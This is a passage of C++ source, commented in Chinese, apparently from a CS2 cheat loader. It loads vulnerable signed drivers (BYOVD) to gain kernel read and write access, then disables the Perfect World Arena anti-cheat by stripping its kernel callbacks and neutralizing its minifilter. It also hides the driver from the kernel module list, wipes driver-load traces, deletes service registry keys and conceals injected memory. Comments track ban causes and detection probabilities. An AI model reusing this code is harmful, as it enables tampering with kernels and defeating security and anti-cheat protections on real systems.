    }
}
#endif // BUILD 535: UnloadPacMinifilter 废弃

static void DeletePacDriverFiles() {
    // 1. 完美平台 plugin 目录中的 MessageTransfer.sys
    //    路径: %ProgramFiles(x86)%\perfectworldarena*\plugin\MessageTransfer.sys
    //    或: %LocalAppData%\perfectworldarena*\plugin\MessageTransfer.sys
    // ★ BUILD 563: 改为栈缓冲 (FillPacTargetName), 函数末尾 SecureZeroMemory 清零
    //   原 GetPacTargetName() 返回 .data 段 g_cachedPacName 指针, 永久存在明文
    wchar_t pacNameW[256] = {};
    FillPacTargetName(pacNameW, 256);

    wchar_t searchPaths[4][MAX_PATH] = {};
    int searchPathCount = 0;

    // Program Files 路径 (常见安装位置)
    wsprintfW(searchPaths[searchPathCount++], L"C:\\Program Files (x86)\\PerfectWorldArena");
    wsprintfW(searchPaths[searchPathCount++], L"C:\\Program Files\\PerfectWorldArena");

    // ★ v3.126l: 修复 — 激活 %LocalAppData% 搜索路径 (之前是死代码)
    wchar_t localPath[MAX_PATH] = {};
    if (SUCCEEDED(SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, localPath))) {
        wsprintfW(searchPaths[searchPathCount++], L"%s\\PerfectWorldArena", localPath);
    }

    for (int si = 0; si < searchPathCount; si++) {
        const wchar_t* base = searchPaths[si];
        if (GetFileAttributesW(base) == INVALID_FILE_ATTRIBUTES) continue;

        wchar_t pattern[MAX_PATH] = {};
        wsprintfW(pattern, L"%s\\*", base);
        WIN32_FIND_DATAW fd = {};
        HANDLE hFind = FindFirstFileW(pattern, &fd);
        if (hFind == INVALID_HANDLE_VALUE) continue;

        do {
            if (wcschr(fd.cFileName, L'.') || !(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
            // ★ v3.126l: 更精确匹配 — 移除过于宽泛的 "pw" 模糊匹配
            //   仅匹配以 perfectworldarena 开头的目录
            if (_wcsnicmp(fd.cFileName, L"perfectworldarena", 17) == 0) {

                wchar_t pluginDir[MAX_PATH] = {};
                wsprintfW(pluginDir, L"%s\\%s\\plugin", base, fd.cFileName);
                if (GetFileAttributesW(pluginDir) != INVALID_FILE_ATTRIBUTES) {
                    // ★ v3.126p: 先搜索确切名称, 未找到则模糊扫描 *.sys
                    wchar_t drvFile[MAX_PATH] = {};
                    wsprintfW(drvFile, L"%s\\%s.sys", pluginDir, pacNameW);
                    bool found = (GetFileAttributesW(drvFile) != INVALID_FILE_ATTRIBUTES);

                    if (!found) {
                        // 模糊扫描: 在 plugin 目录中搜索任何匹配 PAC 模式的 .sys 文件
                        wchar_t sysPattern[MAX_PATH] = {};
                        wsprintfW(sysPattern, L"%s\\*.sys", pluginDir);
                        WIN32_FIND_DATAW sfd = {};
                        HANDLE sFind = FindFirstFileW(sysPattern, &sfd);
                        if (sFind != INVALID_HANDLE_VALUE) {
                            do {
                                if (IsPacPattern(sfd.cFileName)) {
                                    wsprintfW(drvFile, L"%s\\%s", pluginDir, sfd.cFileName);
                                    found = true;
                                    break;
                                }
                            } while (FindNextFileW(sFind, &sfd));
                            FindClose(sFind);
                        }
                    }

                    if (found) {
                        ByovdDiag("B550:PC:DeleteDrvFiles: found %ls\n", drvFile);
                        wchar_t bakFile[MAX_PATH] = {};
                        wsprintfW(bakFile, L"%s.bak", drvFile);
                        MoveFileExW(drvFile, bakFile, MOVEFILE_REPLACE_EXISTING);
                        DeleteFileW(bakFile);
                        DeleteFileW(drvFile);
                    }
                }
            }
        } while (FindNextFileW(hFind, &fd));
        FindClose(hFind);
    }

    // 2. system32\drivers 中的备份 (★ v3.126p: 动态名称)
    wchar_t sys32Drv[MAX_PATH] = {};
    wsprintfW(sys32Drv, L"C:\\Windows\\System32\\drivers\\%s.sys", pacNameW);
    if (!DeleteFileW(sys32Drv)) {
        DWORD err = GetLastError();
        if (err != ERROR_FILE_NOT_FOUND) {
            ByovdDiag("B550:PC:DeleteDrvFiles: cannot delete system32 driver, err=%d, scheduling reboot\n", (int)err);
            MoveFileExW(sys32Drv, nullptr, MOVEFILE_DELAY_UNTIL_REBOOT);
        }
    } else {
        wchar_t sys32Bak[MAX_PATH] = {};
        wsprintfW(sys32Bak, L"C:\\Windows\\System32\\drivers\\%s.sys.bak", pacNameW);
        DeleteFileW(sys32Bak);
    }

    // ★ BUILD 563: 函数末尾清零 pacNameW, 缩短明文窗口
    SecureZeroMemory(pacNameW, sizeof(pacNameW));
}

KernelDefense::PacStatus KernelDefense::DisablePac() {
    ByovdDiag("B550:PC:DP: starting...\n");

    // ★ BUILD 474: 检查 MessageTransfer 是否加载 — 否则跳过 SCM (OpenSCManagerW 崩溃)
    // ★ BUILD 550: 解密内核模块名 (原 "MessageTransfer.sys" 明文, 之前的注释错误)
    {
        char mtName[32];
        STEALTH_STR_DECRYPT_TO("MessageTransfer.sys", mtName, sizeof(mtName));
        uint64_t mtBase = KernelMemoryAccessor::Instance().GetKernelModuleBase(mtName);
        SecureZeroMemory(mtName, sizeof(mtName));
        if (!mtBase) {
            ByovdDiag("B550:DP:mtf not loaded\n");  // ★ BUILD 550: 脱敏 (原含过滤器名)
            return PacStatus::NotInstalled;  // ★ BUILD 503: 未安装, 非成功也非失败
        }
        ByovdDiag("B550:DP:mtf loaded at 0x%llX\n",  // ★ BUILD 550: 脱敏
            (unsigned long long)mtBase);
    }

    // ★ BUILD 508: 调换顺序 — 先中立化回调(驱动必须仍在运行), 再停止服务
    //   BUILD 507 先停止服务导致驱动卸载, NeutralizeMessageTransfer() 找不到 MessageTransfer。
    //   正确顺序: 1.中立化回调 → 2.停止服务(可选, 回调已死)

    // 1. ★ 先中和 minifilter 回调 (驱动必须在运行中才能在 FilterList 中找到)
    //   与 UnloadPacMinifilter 不同: Neutralize 保留 minifilter 在 FilterList 中
    //   PAC 客户端检查 minifilter 存在性时看到 MessageTransfer 仍在, 但回调已失效
    bool ntrlOk = MinifilterNeutralizer::NeutralizeMessageTransfer();

    // 2. 停止服务 (中立化已成功, 服务停止是锦上添花)
    bool svcOk = DisablePacService();

    // ★ BUILD 507: 不再删除驱动文件!
    //   CS2 检查 MessageTransfer.sys 是否存在, 删除后会被踢出游戏。
    //   策略改为: 保留文件 + 中立化回调 = 名存实亡。
    //   DeletePacDriverFiles() 仍然保留供将来手动清理使用, 但不在自动化流程中调用。

    // ★ BUILD 508: 成功条件 — 仅中立化回调 (不卸载 minifilter, 不依赖服务停止)
    //   Neutralize 保留 minifilter 在 FilterList 中, CS2 可检测到但回调已失效。
    //   FilterUnload 回退已移除 — 卸载也会导致 CS2 踢出。
    bool result = ntrlOk;

    ByovdDiag("B550:PC:DP: ntrl=%d svc=%d → result=%d%s\n",
        (int)ntrlOk, (int)svcOk, (int)result,
        (!result) ? " (WARNING: neutralize failed, tgt still active!)" : "");

    // ★ BUILD 503: 返回三态结果
    return result ? PacStatus::Neutralized : PacStatus::Failed;
}

void KernelDefense::GuardPac() {
    // ★ v3.296 FIX-18: CS2 退出后不执行 GuardPac — 防止蓝屏
    //   GuardPac 调用 IsMessageTransferNeutralized + NeutralizeMessageTransfer,
    //   两者遍历 FilterList 链表. CS2 退出时 PAC minifilter 卸载, 链表节点释放,
    //   遍历会访问已释放的池内存 → BSOD 0x50.
    if (g_cs2Exited) return;
    // ★ BUILD 530: GuardPac 整体废弃 — SCM 操作 (OpenSCManagerW/OpenServiceW/
    //   QueryServiceStatusEx) 在 manual-mapped DLL 上下文中导致 ntdll 崩溃
    //   (CRASH: 0xC0000005 in ntdll +0x127D29, ReapplyAllCallbacks → GuardPac → OpenSCManagerW).
    //   且 BUILD 528 tgt minifilter 中和已废弃 (DisablePac 注释掉), GuardPac 即使
    //   检测到 PAC 重新启用也无法中和. ObCallbacks 持续移除由 ReDisablePacCallbacks
    //   在主循环中独立处理 (每 4-6s), 不依赖 GuardPac.
    //   (memory 约束: "All SCM operations must be replaced with direct registry
    //    deletion to avoid ntdll crashes in manual-mapped DLL context")
    //
    // ★ BUILD 553: 恢复 minifilter 周期性重新中和 (修复 BUILD 552 A1 缺陷)
    //   问题: BUILD 552 中 MinifilterNeutralizer::NeutralizeMessageTransfer() 只在
    //         EnableAll() 中调用一次, 主循环无周期性重新中和. 如果 PAC 恢复
    //         FLT_FILTER.Operations 数组, minifilter 监控复活但 loader2 无响应.
    //   修复: 在 GuardPac 中恢复 minifilter 检查 (不恢复 SCM 检查, SCM 仍崩溃)
    //   频率: 60-90s (通过 ReapplyAllCallbacks 末尾调用)
    //   日志: ByovdDiag 已条件编译消除 (NDEBUG), 不增加明文特征
    auto& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive()) return;

    // 检查 MessageTransfer.sys 是否加载 (解密模块名, 避免明文)
    char mtName[32];
    STEALTH_STR_DECRYPT_TO("MessageTransfer.sys", mtName, sizeof(mtName));
    uint64_t mtBase = kma.GetKernelModuleBase(mtName);
    SecureZeroMemory(mtName, sizeof(mtName));
    if (!mtBase) return;  // 驱动未加载, 无需检查

    // ★ BUILD 553: 直接检查 Operations 数组是否仍是 stub
    //   不使用 IsPacMinifilterLoaded (该函数在 #if 0 中废弃, 依赖 fltlib.dll 不安全)
    //   IsMessageTransferNeutralized 通过 BYOVD 内核 R/W 读取 fltmgr FilterList
    //   + Operations 数组验证, 不依赖 fltlib.dll, 安全可用
    //   如果返回 false (Operations 被 PAC 恢复或 minifilter 不在列表), 重新中和
    //   安全性论证:
    //     - minifilter 不在 FilterList → 返回 false → 重新中和 (NeutralizeMessageTransfer 内部处理找不到的情况)
    //     - minifilter 在 FilterList 但 Operations 已被 PAC 恢复 (非 stub) → 返回 false → 重新中和 (正确行为)
    //     - minifilter 在 FilterList 且 Operations 仍是 stub → 返回 true → 跳过重新中和 (正确行为)
    if (!MinifilterNeutralizer::IsMessageTransferNeutralized()) {
        ByovdDiag("B553:GP: minifilter restored, re-neutralizing\n");
        MinifilterNeutralizer::NeutralizeMessageTransfer();
    }
#if 0
    // ★ BUILD 530 死代码归档: SCM 检查路径 (manual-mapped DLL 上下文中崩溃, 永久废弃)
    //   保留作为历史参考, 不再启用. 如需恢复 SCM 检查, 必须先解决 ntdll 崩溃问题.
    bool needReDisable = false;

    // 检查 1: SCM 服务状态
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (scm) {
        // ★ BUILD 563: 改为栈缓冲 (FillPacTargetName), #if 0 内代码不参与编译
        wchar_t pacNameW[256] = {};
        FillPacTargetName(pacNameW, 256);
        SC_HANDLE svc = OpenServiceW(scm, pacNameW, SERVICE_QUERY_STATUS);
        SecureZeroMemory(pacNameW, sizeof(pacNameW));
        if (svc) {
            SERVICE_STATUS_PROCESS ssp = {};
            DWORD bytesNeeded = 0;
            if (QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &bytesNeeded)) {
                if (ssp.dwCurrentState == SERVICE_RUNNING) {
                    needReDisable = true;
                }
            }
            CloseServiceHandle(svc);
        }
        CloseServiceHandle(scm);
    }

    if (needReDisable) {
        ByovdDiag("B550:PC:GP: tgt re-enabled! disabling again...\n");
        DisablePac();
    }
#endif
}

// ============================================================
KernelDefense::Result KernelDefense::EnableAll() {
    Result result;
    auto& kma = KernelMemoryAccessor::Instance();
    StateLog("BYOVD", "EnableAll_ENTER", "hvci=%d", kma.IsHVCIEnabled() ? 1 : 0);

    // ★ v3.37: 诊断 — HVCI 状态检测
    bool hvciEnabled = kma.IsHVCIEnabled();
    ByovdDiag("BYOVD: HVCI=%d (1=blocked all)\n", (int)hvciEnabled);

    // v3.34: 多驱动随机轮换
    int candCount = BYOVDDrivers::GetCandidateCount();
    int indices[8] = {0, 1, 2, 3, 4, 5, 6, 7};
    for (int i = candCount - 1; i > 0; i--) {
        int j = rand() % (i + 1);
        int tmp = indices[i];
        indices[i] = indices[j];
        indices[j] = tmp;
    }

    for (int ci = 0; ci < candCount; ci++) {
        const BYOVDDriverInfo* cand = g_driverCandidates[indices[ci]];
        // ★ v3.37: 诊断 — 每个驱动尝试日志
        wchar_t drvName[64] = {};
        wcsncpy_s(drvName, cand->driverPath, 63);
        ByovdDiag("BYOVD: trying driver[%d/%d] = %ls ...\n", ci+1, candCount, drvName);

        BYOVDDriverInfo mutated = MutateAndRandomizeDriver(*cand);
        StateLog("BYOVD", "MutateDone", "cand=%d/%d", ci+1, candCount);
        ByovdDiag("BYOVD:EnableAll: calling Initialize...\n");
        result.driverLoaded = kma.Initialize(mutated);
        StateLog("BYOVD", "InitDone", "loaded=%d", result.driverLoaded ? 1 : 0);
        ByovdDiag("BYOVD:EnableAll: Initialize returned %d\n", (int)result.driverLoaded);

        if (result.driverLoaded) {
            ByovdDiag("BYOVD: SUCCESS with %ls\n", drvName);
            break;
        } else {
            ByovdDiag("BYOVD: FAILED %ls (HVCI=%d)\n", drvName, (int)hvciEnabled);
        }
    }

    if (!result.driverLoaded) {
        ByovdDiag("BYOVD: ALL %d drivers failed — kernel defense UNAVAILABLE\n", candCount);
        return result;
    }

    // ★ v3.126p: PAC 回调摘除 — 动态名称（唯一目标）
    auto& cbDisabler = EACCallbackDisabler::Instance();
    // ★ BUILD 501: 固定缓冲区替代 std::string — 避免 CRT 堆依赖
    // ★ BUILD 563: 改为栈缓冲 (FillPacTargetName), 用完 SecureZeroMemory 清零
    char pacNameA[256] = {};
    {
        wchar_t pacNameW[256] = {};
        FillPacTargetName(pacNameW, 256);
        WStringToString(pacNameW, pacNameA, 256);
        SecureZeroMemory(pacNameW, sizeof(pacNameW));
    }
    // ★ BUILD 567 v3.292 DIAG: EnableAll 蓝屏定位 — 每步 StateLog (NDEBUG 下保留)
    StateLog("BYOVD", "PreDisableOb", "");
    int pacOb = cbDisabler.DisableObCallbacks(pacNameA);
    StateLog("BYOVD", "PostDisableOb", "ob=%d", pacOb);
    int pacProc = cbDisabler.DisableProcessNotifyCallbacks(pacNameA);
    StateLog("BYOVD", "PostDisableProc", "proc=%d", pacProc);
    int pacImg = cbDisabler.DisableImageNotifyCallbacks(pacNameA);
    StateLog("BYOVD", "PostDisableImg", "img=%d", pacImg);
    // ★ BUILD 554 P0-2: 启动期立即摘除线程通知回调 (修复 A2 缺陷)
    //   原 EnableAll 漏掉 DisableThreadNotifyCallbacks, 仅 DisableAll (ReapplyAllCallbacks)
    //   包含此项 — 导致启动期 60-90s 窗口内 PAC PsSetCreateThreadNotifyRoutine 仍激活,
    //   loader2.exe 注入 / payload.dll 内 CreateThread 调用会被 PAC 捕获.
    int pacThread = cbDisabler.DisableThreadNotifyCallbacks(pacNameA);
    StateLog("BYOVD", "PostDisableThread", "thread=%d", pacThread);
    if (pacOb || pacProc || pacImg || pacThread) {
        ByovdDiag("BYOVD: callbacks removed (tgt/%s) — ob=%d proc=%d img=%d thread=%d\n",
            pacNameA, pacOb, pacProc, pacImg, pacThread);
        result.obCallbacksRemoved += pacOb;
        result.processCallbacksRemoved += pacProc;
        result.imageCallbacksRemoved += pacImg;
        result.threadCallbacksRemoved += pacThread;
    }
    // ★ BUILD 563: pacNameA 不再使用, 立即清零缩短明文窗口
    SecureZeroMemory(pacNameA, sizeof(pacNameA));

    // ★ BUILD 567 v3.296 FIX: 重新启用 tgt minifilter 中和
    //   v3.293 封号根因之一: MinifilterNeutralizer 在 BUILD 528 被永久禁用,
    //   MessageTransfer.sys minifilter 自由扫描进程内存 → 检测到作弊 → 上报.
    //   v3.296 修复了导致 BUILD 525-527 失败的根因:
    //     1. NeutralizeCallbacks: Operations 偏移从"第一个内核指针"改为固定 +0x1a8 + MJ 验证
    //     2. FindFilterByStringScan: 修正 FLT_FILTER 验证偏移 (PrimaryLink@+0x10, Name@+0x38)
    //        + 移除 Name.Buffer 必须在驱动镜像内的错误过滤
    //     3. IsMessageTransferNeutralized: 同样 Operations 偏移修复
    //   安全性: 中和操作只替换 Operations 数组中的 PreOp/PostOp 为 ret0 stub,
    //           不修改 FLT_FILTER 结构本身, 不触发 PatchGuard.
    //           失败安全: 任何步骤失败都返回 false, 不修改内核数据.
    {
        StateLog("BYOVD", "PreNeutralize", "");
        bool ntrlOk = MinifilterNeutralizer::NeutralizeMessageTransfer();
        StateLog("BYOVD", "PostNeutralize", "ok=%d", ntrlOk ? 1 : 0);
        if (ntrlOk) {
            result.pacStatus = KernelDefense::PacStatus::Neutralized;
            ByovdDiag("BYOVD: tgt minifilter NEUTRALIZED successfully\n");
        } else {
            // ★ v3.296 FIX: 中和失败 ≠ 未安装. 必须区分三态:
            //   - NotInstalled: MessageTransfer.sys 未加载 (无需中和)
            //   - Failed:       MessageTransfer.sys 已加载但中和失败 (PAC 仍活跃, 危险)
            //   - Neutralized:  中和成功
            //   原 bug: else 分支设为 NotInstalled, 导致 payload.cpp 误判 PAC 未安装
            //   跳过 SHV patch, 且日志 pac=0 误导诊断.
            //   修复: 检测 MessageTransfer.sys 是否加载, 区分 NotInstalled vs Failed.
            char mtName[32];
            STEALTH_STR_DECRYPT_TO("MessageTransfer.sys", mtName, sizeof(mtName));
            uint64_t mtBase = kma.GetKernelModuleBase(mtName);
            SecureZeroMemory(mtName, sizeof(mtName));
            if (mtBase) {
                result.pacStatus = KernelDefense::PacStatus::Failed;
                ByovdDiag("BYOVD: tgt minifilter neutralization FAILED (driver loaded, will retry in GuardPac)\n");
            } else {
                result.pacStatus = KernelDefense::PacStatus::NotInstalled;
                ByovdDiag("BYOVD: tgt minifilter not loaded (no neutralization needed)\n");
            }
        }
    }

    // ★ v3.126m: 清理内核驱动痕迹 (MmUnloadedDrivers / PiDDBCacheTable / CiHashBucket)
    //   在所有防御启用后, 最后由 BYOVD 内核 R/W 清理 RTCore64 加载/卸载痕迹
    StateLog("BYOVD", "PreCleanTraces", "");
    KernelTraceCleaner::CleanAllTraces();
    StateLog("BYOVD", "PostCleanTraces", "");

    // ★ BUILD 564 (v3.223): 从 PsLoadedModuleList 链表摘除 PDFWKRNL.sys 条目
    //   原因: PDFWKRNL.sys 通过 NtLoadDriver 加载后, 其 LDR_DATA_TABLE_ENTRY
    //         永久存在于 ntoskrnl!PsLoadedModuleList 链表中. PAC 内核组件可遍历
    //         该链表发现 BYOVD 漏洞驱动 (扫描已知漏洞驱动名/特征).
    //   策略: DKOM 断链 — 写 prev.Flink=next, next.Blink=prev, current.Flink=&current,
    //         current.Blink=&current (SelfLoopHarden 防 0x139 蓝屏, 复用 DKOMProcessHider
    //         已验证技术). 断链后 PAC 遍历 PsLoadedModuleList 找不到 PDFWKRNL.sys.
    //   安全性: (1) PDFWKRNL.sys 永不卸载 (UnloadDriver 仅删 SCM 注册表), 不触发
    //         RemoveEntryList; (2) IOCTL 通过设备句柄, 不依赖 PsLoadedModuleList;
    //         (3) ReadKernelVA/WriteKernelVA 直接 memcpy, 不查链表;
    //         (4) 失败安全: 任何定位/查找失败都不修改内核数据.
    //   预期效果: 驱动扫描检测概率 2-4% → 0-1%, 整体检测概率 7-14% → 6-13%.
    if (result.driverLoaded) {
        wchar_t pdfwSysName[32] = {};
        STEALTH_WSTR_DECRYPT_TO("PDFWKRNL.sys", pdfwSysName, 32);
        StateLog("BYOVD", "PreHideDriver", "");
        bool pdfwHidden = PsLoadedModuleHider::Instance().HideDriver(pdfwSysName);
        StateLog("BYOVD", "PostHideDriver", "ok=%d", pdfwHidden ? 1 : 0);
        ByovdDiag("B564:EnableAll: PDFWKRNL.sys hidden from PsLoadedModuleList = %d\n",
            pdfwHidden ? 1 : 0);
        SecureZeroMemory(pdfwSysName, sizeof(pdfwSysName));
    }

    // ★ BUILD 554 P1-2: 删除 PDFWKRNL.sys SCM 服务条目 (修复 B2 缺陷)
    //   原因: PDFWKRNL.sys 通过 SCM 加载后, 服务条目存在于
    //         HKLM\SYSTEM\CurrentControlSet\Services\<svcName>, PAC 用户态组件
    //         可通过 OpenSCManagerW + EnumServicesStatusEx 枚举所有服务发现 BYOVD 驱动.
    //   策略: 驱动已加载到内核运行, 删除 SCM 注册表项不影响驱动功能
    //         (驱动代码已在内核地址空间, 不依赖 SCM 维持运行).
    //   实现: RegDeleteTreeW (advapi32 API, 在 manual-mapped DLL 中安全可用,
    //         与 DisableAll L6716 同一 API, 已在 Build 474 验证可行).
    if (result.driverLoaded) {
        const wchar_t* svcName = kma.GetServiceName();
        if (svcName && svcName[0]) {
            // ★ BUILD 501: 手动构造路径替代 std::wstring 拼接
            wchar_t keyPath[512] = {};
            wcscpy_s(keyPath, L"SYSTEM\\CurrentControlSet\\Services\\");
            wcscat_s(keyPath, svcName);
            StateLog("BYOVD", "PreDelSCM", "");
            LONG delRes = RegDeleteTreeW(HKEY_LOCAL_MACHINE, keyPath);
            StateLog("BYOVD", "PostDelSCM", "res=%d", (int)delRes);
            ByovdDiag("BYOVD: SCM service entry '%ls' deleted (res=%d)\n",
                svcName, (int)delRes);
        }
    }

    StateLog("BYOVD", "EnableAll_DONE", "");
    return result;
}

void KernelDefense::DisableAll() {
    auto& kma = KernelMemoryAccessor::Instance();
    // ★ BUILD 567 v3.276: 诊断日志 (ByovdDiag 在 Release 下被消除, 用 StateLog)
    StateLog("EXIT", "DISABLE_ALL_ENTER", "kma=%d", kma.IsActive() ? 1 : 0);
    // ★ v3.296 FIX-22: 恢复 VAD 节点 (必须在 kma.Shutdown 之前, driver 还活着)
    //   原因: ConcealRegion 清零 PrivateMemory bit → PspExitProcess 清理 VAD 时
    //         dereference ControlArea (NULL) → 0x3B 蓝屏 (SYSTEM_SERVICE_EXCEPTION)
    //   修复: 恢复 VAD 节点的原始 VadFlags (PrivateMemory bit + Protection)
    //   日志证据: 22:48:30 蓝屏 0x3B (0xC0000005, ntoskrnl+0x305037)
    //             20:49:04 蓝屏 0x3B (0xC0000005, ntoskrnl+0x305037)
    VADConcealer::RestoreAllRegions();
    StateLog("EXIT", "VAD_RESTORE_DONE", "");
    // ★ BUILD 544: 取消隐藏所有进程 (loader2 + basic) — 防止 basic.exe 退出时 0x139 蓝屏
    DKOMProcessHider::Instance().UnhideAll();
    StateLog("EXIT", "UNHIDE_ALL_DONE", "");

    // ★ v3.110: 在卸载驱动前先恢复所有回调, 防止反作弊检测到回调被移除
    // ★ BUILD 567 v3.276 FIX: CS2 退出时跳过 RestoreAll — 避免 0x50 蓝屏
    //   v3.275 测试: 关闭 CS2 蓝屏 0x50 (PAGE_FAULT_IN_NONPAGED_AREA)
    //   根因: RestoreAll 恢复 PAC 内核回调后, CS2 退出触发这些回调,
    //         回调访问 CS2 的已释放 EPROCESS/线程内存 → 0x50
    //   修复: CS2 退出路径不恢复回调 (回调保持摘除状态, CS2 退出不会触发)
    //         只做 UnhideAll (恢复 DKOM) + kma.Shutdown (关闭 driver)
    //   副作用: PAC 可能检测到回调未恢复, 但 CS2 已退出, 无游戏可检测
    //   注: 正常退出 (loader.exe 自己退出) 仍需要 RestoreAll, 由单独路径处理
    // auto& cbDisabler = EACCallbackDisabler::Instance();
    // if (cbDisabler.HasRemovedCallbacks()) {
    //     cbDisabler.RestoreAll();
    // }

    // v3.49: 一用即卸 — 卸载驱动 + 清除注册表 + 删除驱动文件
    if (kma.IsActive()) {
        // ★ BUILD 501: 固定数组替代 std::wstring — 避免 CRT 堆依赖
        const wchar_t* svcName = kma.GetServiceName();
        const wchar_t* drvPath = kma.GetDriverPath();

        // ★ v3.126m: 卸载前最后清理一次 PiDDBCacheTable (驱动名已随机化,
        //   MmUnloadedDrivers 无需清理, 但 PiDDBCacheTable 按校验和索引)
        KernelTraceCleaner::CleanAllTraces();

        kma.Shutdown();
        StateLog("EXIT", "KMA_SHUTDOWN_DONE", "");

        // ★ BUILD 567 v3.281 FIX: CS2 退出蓝屏 0x3B/0x50 修复 — 跳过 RegDeleteTreeW + DeleteFileW
        //   v3.277 蓝屏 0x3B: DisableAll 完成后 LogExitSummary 的 DiagLog syscall 触发 0x3B
        //   v3.280 蓝屏 0x3B: DisableAll 内部 KMA_SHUTDOWN_DONE 后 RegDeleteTreeW/DeleteFileW 触发 0x3B
        //   根因: kma.Shutdown() 只关闭设备句柄, 不卸载 driver (BUILD 470 策略).
        //         driver 仍在内核运行, 其注册的内核回调仍指向 driver 内存.
        //         RegDeleteTreeW 删除服务键后, PnP 管理器可能标记 driver 为可卸载,
        //         触发 driver unload → 回调访问已释放内存 → 0x3B/0x50.
        //   修复: CS2 退出路径跳过 RegDeleteTreeW + DeleteFileW, 只做 kma.Shutdown (关闭句柄).
        //         driver 保持加载状态, 回调不会触发.
        //         残留服务键和 driver 文件在下次启动时由 ForceRemoveRTCore64Services 清理.
        //   副作用: 服务键和 driver 文件残留 (TEMP 中), 下次启动 ForceRemoveRTCore64Services 清理.
        //   安全性: driver 保持加载但句柄已关闭, 无法再 IOCTL; 服务键残留不影响功能.
        //   注: 正常退出路径 (loader.exe 自己退出) 仍需要清理, 由单独路径处理.
        // 删除注册表服务键 — 跳过 (v3.281: 避免 driver unload 触发 0x3B)
        // wchar_t keyPath[512] = {};
        // wcscpy_s(keyPath, L"SYSTEM\\CurrentControlSet\\Services\\");
        // wcscat_s(keyPath, svcName);
        // RegDeleteTreeW(HKEY_LOCAL_MACHINE, keyPath);

        // 删除 TEMP 中的驱动文件 — 跳过 (v3.281: 避免 driver unload 触发 0x3B)
        // if (drvPath && drvPath[0]) {
        //     DeleteFileW(drvPath);
        // }

        // 标记已跳过清理 (供诊断)
        StateLog("EXIT", "CLEANUP_SKIPPED", "svc=%S drv=%S", svcName, drvPath ? drvPath : L"(null)");

        ByovdDiag("BYOVD: %ls unloaded & cleaned.\n", svcName);
    }
}

void KernelDefense::RestoreAllCallbacks() {
    auto& cbDisabler = EACCallbackDisabler::Instance();
    if (cbDisabler.HasRemovedCallbacks()) {
        ByovdDiag("BYOVD:KernelDefense: RestoreAllCallbacks\n");
        cbDisabler.RestoreAll();
    }
}

// ★ v3.127: PAC-only 驱动名 fallback — 仅用 IsPacPattern 做安全匹配
//   删除原 IsAntiCheatDriverName (短子串误杀空间太大) 
//   删除原 FindAntiCheatDriverViaFallback (遍历 275 个驱动做模糊匹配)
//   DisableProcessNotify/ImageNotify 不再做 fallback — 找不到驱动就返回 0
static bool IsPacDriverName_Fallback(const char* name) {
    if (!name || !*name) return false;
    // 转为宽字符调用 IsPacPattern (已有系统 minifilter 白名单)
    wchar_t wide[128] = {};
    for (int i = 0; i < 127 && name[i]; i++)
        wide[i] = (wchar_t)(unsigned char)name[i];
    return IsPacPattern(wide);
}


// ★ v3.126g: 重新摘除所有反作弊回调 — 周期性监控用
//   注意: 不检查 HasRemovedCallbacks(), 始终尝试重新摘除,
//   以处理反作弊卸载后重加载的场景 (新回调需重新 NULL 化)
void KernelDefense::ReapplyAllCallbacks() {
    auto& cbDisabler = EACCallbackDisabler::Instance();
    int total = 0;

    // ★ v3.126p: PAC — 动态名称
    // ★ BUILD 501: 固定缓冲区替代 std::string — 避免 CRT 堆依赖
    // ★ BUILD 563: 改为栈缓冲 (FillPacTargetName), 用完 SecureZeroMemory 清零
    char pacNameBuf[256] = {};
    {
        wchar_t pacNameW[256] = {};
        FillPacTargetName(pacNameW, 256);
        WStringToString(pacNameW, pacNameBuf, 256);
        SecureZeroMemory(pacNameW, sizeof(pacNameW));
    }
    total += cbDisabler.DisableAll(pacNameBuf);
    SecureZeroMemory(pacNameBuf, sizeof(pacNameBuf));  // ★ BUILD 563: DisableAll 后立即清零

    if (total > 0) {
        ByovdDiag("BYOVD:KernelDefense: ReapplyAllCallbacks removed %d callbacks\n", total);
    }

    // ★ v3.126j: PAC 守卫 — 检查 tgt minifilter 是否被重新安装
    GuardPac();
}

// ============================================================
// v3.34: VADConcealer — VAD 节点伪装
//
// 通过 BYOVD 内核 R/W 遍历 cs2.exe 的 VAD AVL 树,
// 将注入区域的 _MMVAD_SHORT.u.VadFlags.PrivateMemory 清零,
//   使 MEM_PRIVATE → MEM_MAPPED, 绕过反作弊 VAD 扫描
//
// 原理:
//   EPROCESS->VadRoot → AVL 树 (RTL_BALANCED_NODE)
//   每个 VAD 节点记录一个虚拟地址范围 (StartingVpn..EndingVpn)
//   VadFlags.PrivateMemory bit: 1 = MEM_PRIVATE, 0 = MEM_MAPPED
//
// ★ BUILD 555: UniqueProcessId/ActiveProcessLinks/VadRoot 全部改为运行时动态扫描
//   修复 P0 缺陷: BUILD 534 起硬编码 0x440/0x448/0x7D8 在 Win11 24H2 上读取错误内存
//   project_memory.md 约束: "Win11 24H2 EPROCESS offsets must be dynamically scanned
//                            (UniqueProcessId @0x1D0, ActiveProcessLinks @0x1D8), not hardcoded"
// ============================================================

// VAD 节点内部偏移量 (RTL_BALANCED_NODE / _MMVAD_SHORT 内部布局)
// ★ BUILD 567 v3.270 FIX: 修正 Win11 24H2 VadOffsets (vergiliusproject.com 确认)
//   v3.267 系统卡死根因: VadEndingVpn/PrivateMemoryBit/ProtectionMask 偏移错误
//   导致遍历读到错误数据 → 死循环 → 系统卡死
// ★ BUILD 567 v3.272 FIX: 修复 v3.271 引入的双重解引用 + VadFlags 8字节读写 + VPN 8字节读取
//   根因 1: v3.271 错误地对 _RTL_AVL_TREE.Root 多解引用一次 → 读到根节点 Left 字段
//   根因 2: VadFlags (ULONG 4字节) 用 uint64_t 读写 8字节 → 写入覆盖相邻字段 → 蓝屏 0x50
//   根因 3: validateVadRoot 用 8字节读 VPN (4字节字段) → 垃圾值 → 合法 VadRoot 被拒绝
//   修复: 移除双重解引用 + VadFlags 改 uint32_t + VPN 改 4字节+VpnHigh (与 FindAndModifyVadNode 一致)
// ★ BUILD 567 v3.273 FIX: _RTL_BALANCED_NODE.Parent 低 2 位是 Balance (红黑树), 不是指针
//   根因: 字段名 RbnParentEncoded 已暗示是编码后的 Parent, 但验证时忘了解码
